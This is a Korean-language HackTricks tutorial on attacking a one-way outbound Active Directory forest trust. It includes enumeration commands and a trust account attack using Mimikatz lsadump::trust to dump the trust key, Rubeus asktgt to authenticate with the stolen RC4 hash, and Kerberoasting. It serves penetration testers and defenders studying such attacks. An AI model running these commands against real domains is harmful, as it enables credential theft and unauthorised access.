# 외부 포레스트 도메인 - 일방향 (아웃바운드)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로에서 영웅까지 AWS 해킹을 배우세요</strong>!</summary>

다른 방법으로 HackTricks를 지원하는 방법:

- **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드하길 원한다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
- **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 기술을 공유**하세요.

</details>

이 시나리오에서 **귀하의 도메인**은 **다른 도메인**의 주요 요소에게 **일부 권한을 위임**합니다.

## 열거

### 아웃바운드 신뢰
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

신뢰 계정 공격

두 도메인 간에 신뢰 관계가 설정되면 보안 취약점이 발생합니다. 여기서 도메인 **A**와 도메인 **B**로 식별되는 두 도메인 간에 신뢰가 확립됩니다. 이 설정에서 도메인 **B**는 도메인 **A**로의 신뢰를 확장합니다. 도메인 **B**와 관련된 특수 계정이 도메인 **A**에 생성되며, 이 계정은 두 도메인 간의 인증 프로세스에서 중요한 역할을 합니다. 이 도메인 **B**와 관련된 계정은 도메인 간 서비스에 액세스하기 위해 티켓을 암호화하는 데 사용됩니다.

여기서 이해해야 할 중요한 측면은 이 특수 계정의 암호와 해시가 도메인 **A**의 도메인 컨트롤러에서 명령 줄 도구를 사용하여 추출될 수 있다는 것입니다. 이 작업을 수행하는 명령은 다음과 같습니다:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
이 추출은 계정이 활성화되어 있고 이름 뒤에 **$**가 붙어 있어 "Domain Users" 그룹에 속한 도메인 **A**의 계정으로 식별되므로 이 그룹과 관련된 권한을 상속받습니다. 이를 통해 개인은 이 계정의 자격 증명을 사용하여 도메인 **A**에 대해 인증할 수 있습니다.

**경고:** 이 상황을 활용하여 사용자로서 도메인 **A**에 발을 들일 수 있지만 권한이 제한적입니다. 그러나 이 액세스는 도메인 **A**에서 열거를 수행하는 데 충분합니다.

신뢰하는 도메인이 `ext.local`이고 신뢰받는 도메인이 `root.local`인 시나리오에서 `EXT$`라는 사용자 계정이 `root.local` 내에 생성됩니다. 특정 도구를 통해 케르버스 신뢰 키를 덤프하여 `root.local`의 `EXT$`의 자격 증명을 확인할 수 있습니다. 이를 달성하기 위한 명령어는 다음과 같습니다:
```bash
lsadump::trust /patch
```
다음으로, 추출된 RC4 키를 사용하여 다른 도구 명령을 통해 `root.local` 내에서 `root.local\EXT$`로 인증할 수 있습니다:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
이 인증 단계는 `root.local` 내의 서비스를 열거하고 심지어 악용할 수 있는 가능성을 엽니다. Kerberoast 공격을 수행하여 서비스 계정 자격 증명을 추출할 수 있습니다.
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 평문 신뢰 암호 수집

이전 흐름에서는 **명확한 텍스트 암호**(또한 **mimikatz에 의해 덤프된**) 대신 신뢰 해시가 사용되었습니다.

명확한 텍스트 암호는 mimikatz의 \[ CLEAR ] 출력을 16진수로 변환하고 널 바이트 '\x00'를 제거하여 얻을 수 있습니다:

![](<../../.gitbook/assets/image (938).png>)

신뢰 관계를 생성할 때 사용자가 신뢰를 위해 암호를 입력해야 할 수도 있습니다. 이 데모에서 키는 원래 신뢰 암호이며 인간이 읽을 수 있습니다. 키가 주기적으로(30일) 변경되면 평문은 인간이 읽을 수 없지만 기술적으로 여전히 사용할 수 있습니다.

평문 암호는 신뢰 계정의 Kerberos 비밀 키를 사용하여 TGT를 요청하는 대체 수단으로 사용할 수 있습니다. 여기서 ext.local에서 root.local을 쿼리하여 Domain Admins의 멤버를 확인하는 예시:

![](<../../.gitbook/assets/image (792).png>)

## 참고 자료

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)로부터 AWS 해킹을 제로부터 전문가까지 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드하길 원한다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **HackTricks 및 HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유하세요.**

</details>
